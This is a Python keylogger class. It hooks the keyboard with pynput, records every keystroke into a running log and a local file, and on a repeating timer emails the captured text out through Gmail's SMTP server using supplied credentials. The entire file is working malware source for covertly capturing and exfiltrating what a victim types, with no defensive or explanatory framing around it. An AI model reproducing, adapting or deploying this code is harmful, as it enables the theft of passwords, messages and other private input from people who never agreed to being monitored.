#!/usr/bin/env python
import pynput.keyboard
import smtplib
import threading


class Keylogger:
    def __init__(self, interval, email, password, dev_mode, receive_email):  # Constructor
        """
        :param interval:
        :param email:
        :param password:
        """
        self.log = "Keylogger started..."
        self.interval = interval
        self.email = email
        self.password = password
        self.dev_mode = dev_mode
        self.receive_email = receive_email

    def display_on_screen(self):
        print("\nCaptured :\n" + self.log)  # Testing
        with open("log_file.txt", "a") as file:
            file.write(self.log)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def input_process(self, key_stroke):
        try:
            current_stroke = str(key_stroke.char)
        except AttributeError:
            if key_stroke == key_stroke.space:
                current_stroke = " "
            else:
                current_stroke = " <" + str(key_stroke) + "> "
        self.log = self.log + current_stroke

    def report(self):
        if not self.log:
            self.log = "[-] Zero keystrokes received"
        if self.dev_mode:
            self.display_on_screen()
        if self.receive_email:
            try:
                self.send_mail(self.email, self.password, "\n\n" + self.log)
            except smtplib.SMTPAuthenticationError:
                print("\n=> Email Authentication failed, incorrect username or password")
        self.log = ""

        # Simultaneous(threading), wait for X secs and run the report function
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(
            on_press=self.input_process)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
